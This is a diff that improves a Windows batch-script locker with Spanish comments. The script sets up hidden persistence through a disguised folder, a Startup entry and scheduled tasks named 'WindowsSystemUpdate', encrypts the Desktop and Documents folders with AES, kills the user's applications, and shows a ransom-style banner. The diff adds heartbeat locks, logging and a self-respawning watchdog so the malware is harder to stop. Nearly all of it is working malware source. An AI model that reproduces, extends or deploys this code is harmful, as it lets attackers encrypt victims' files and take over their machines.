@@ -12,32 +12,46 @@ set "ME=%~f0"
 set "DIR=%APPDATA%\Microsoft\Windows\SystemCache"
 set "EXE=%DIR%\WinSys.bat"
 set "STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
-set "TITLE=Warning-Venice-System"
-set "WTITLE=VeniceWatchdog"
+set "HB=%DIR%\hb"
+set "LOG=%DIR%\log.txt"
 
 if not exist "%DIR%" md "%DIR%" >nul 2>&1
 attrib +h "%DIR%" >nul 2>&1
+>>"%LOG%" echo [%DATE% %TIME%] arranque "%~1"
 
 call :install
+>>"%LOG%" echo [%TIME%] persistencia ok
 
-rem ---- si ya hay una ventana principal, no duplicar ----
-set "RUN=1"
-for /f %%A in ('powershell -NoProfile -WindowStyle Hidden -Command "@(Get-Process cmd -ErrorAction SilentlyContinue ^| ? {$_.MainWindowTitle -eq '%TITLE%'}).Count"') do set "RUN=%%A"
-if "%RUN%"=="" set "RUN=1"
-if %RUN% GEQ 2 (
-    call :ensure_watchdog
+rem ---------------- lock anti-duplicado ----------------
+md "%DIR%\run" >nul 2>&1
+if not errorlevel 1 goto :owner
+
+set "A="
+if exist "%HB%" set /p A=<"%HB%"
+ping -n 3 127.0.0.1 >nul
+set "B="
+if exist "%HB%" set /p B=<"%HB%"
+if not "%A%"=="%B%" (
+    >>"%LOG%" echo [%TIME%] ya hay instancia viva, salgo
     exit /b
 )
+>>"%LOG%" echo [%TIME%] lock viejo, tomo el control
+rd "%DIR%\run" >nul 2>&1
+md "%DIR%\run" >nul 2>&1
+
+:owner
+>>"%LOG%" echo [%TIME%] instancia principal activa
 
 if not exist "%DIR%\.locked" (
     cls
     color 0F
     echo.
     echo   [*] Instalando persistencia...
-    echo   [*] Cifrando Escritorio y Documentos (AES-256)...
+    echo   [*] Cifrando Escritorio y Documentos con AES-256...
     call :encrypt
     >"%DIR%\.locked" echo ok
     attrib +h +s "%DIR%\.locked" >nul 2>&1
+    >>"%LOG%" echo [%TIME%] cifrado ok
 )
 
 mode con cols=150 lines=50 >nul 2>&1
@@ -48,8 +62,10 @@ call :ensure_watchdog
 cls
 color 0C
 call :banner
+>>"%LOG%" echo [%TIME%] entrando al loop
 
 :main
+>"%HB%" echo %TIME%
 call :kill_apps
 call :ensure_watchdog
 echo   [%TIME%]  Sistema activo. Ventana verificada. Aplicaciones cerradas.
@@ -109,26 +125,56 @@ schtasks /create /tn "WindowsSystemUpdate2" /tr "\"%EXE%\"" /sc minute /mo 1 /f 
 exit /b
 
 :ensure_watchdog
-set "W=0"
-for /f %%A in ('powershell -NoProfile -WindowStyle Hidden -Command "@(Get-Process cmd -ErrorAction SilentlyContinue ^| ? {$_.MainWindowTitle -eq '%WTITLE%'}).Count"') do set "W=%%A"
-if "%W%"=="" set "W=0"
-if "%W%"=="0" start "" /min cmd /c ""%EXE%" watchdog"
+set "CUR="
+if exist "%DIR%\whb" set /p CUR=<"%DIR%\whb"
+if "%CUR%"=="" (
+    call :spawn_wd
+    exit /b
+)
+if "%CUR%"=="%WLAST%" (
+    set /a WDEAD+=1 >nul
+) else (
+    set "WDEAD=0"
+)
+set "WLAST=%CUR%"
+if %WDEAD% GEQ 3 (
+    set "WDEAD=0"
+    call :spawn_wd
+)
+exit /b
+
+:spawn_wd
+rd "%DIR%\wd" >nul 2>&1
+start "" /min cmd /c ""%EXE%" watchdog"
 exit /b
 
 :watchdog
 title VeniceWatchdog
 color 0C
 set "EXE=%~f0"
-set "TITLE=Warning-Venice-System"
+set "DIR=%~dp0"
+set "HB=%~dp0hb"
+md "%DIR%wd" >nul 2>&1
+if errorlevel 1 exit /b
+set "DEAD=0"
+set "LAST="
 :wd
-set "N=0"
-for /f %%A in ('powershell -NoProfile -WindowStyle Hidden -Command "@(Get-Process cmd -ErrorAction SilentlyContinue ^| ? {$_.MainWindowTitle -eq '%TITLE%'}).Count"') do set "N=%%A"
-if "%N%"=="" set "N=0"
-if "%N%"=="0" (
-    start "" cmd /c ""%EXE%" boot"
-    ping -n 4 127.0.0.1 >nul
-)
+set "C="
+if exist "%HB%" set /p C=<"%HB%"
+if "%C%"=="" goto :wdspawn
+if "%C%"=="%LAST%" (set /a DEAD+=1 >nul) else (set "DEAD=0")
+set "LAST=%C%"
+if %DEAD% GEQ 3 goto :wdspawn
+>"%DIR%whb" echo %TIME%
 ping -n 6 127.0.0.1 >nul
+goto :wd
+:wdspawn
+set "DEAD=0"
+set "LAST="
+rd "%DIR%run" >nul 2>&1
+start "" cmd /c ""%EXE%" boot"
+>"%DIR%whb" echo %TIME%
+ping -n 10 127.0.0.1 >nul
 goto :wd
 
 :encrypt
@@ -185,7 +231,6 @@ echo.
 echo   Descifrando...
 powershell -NoProfile -ExecutionPolicy Bypass -File "%DIR%\dec.ps1"
 del /q "%DIR%\.locked" >nul 2>&1
-attrib -h -s "%DIR%\.locked" >nul 2>&1
 echo.
 echo   Listo. Archivos restaurados.
 pause
@@ -206,6 +251,8 @@ schtasks /delete /tn "WindowsSystemUpdate" /f >nul 2>&1
 schtasks /delete /tn "WindowsSystemUpdate2" /f >nul 2>&1
 
 taskkill /f /fi "WINDOWTITLE eq VeniceWatchdog" >nul 2>&1
+rd "%DIR%\run" >nul 2>&1
+rd "%DIR%\wd" >nul 2>&1
 
 for %%F in ("%EXE%" "%STARTUP%\WindowsSystem.bat" "%PUBLIC%\WinSys.bat" "%ProgramData%\WinSys.bat" "%USERPROFILE%\WinSys.bat" "%TEMP%\WinSys.bat") do (
     icacls %%~F /remove:d "%USERNAME%" >nul 2>&1
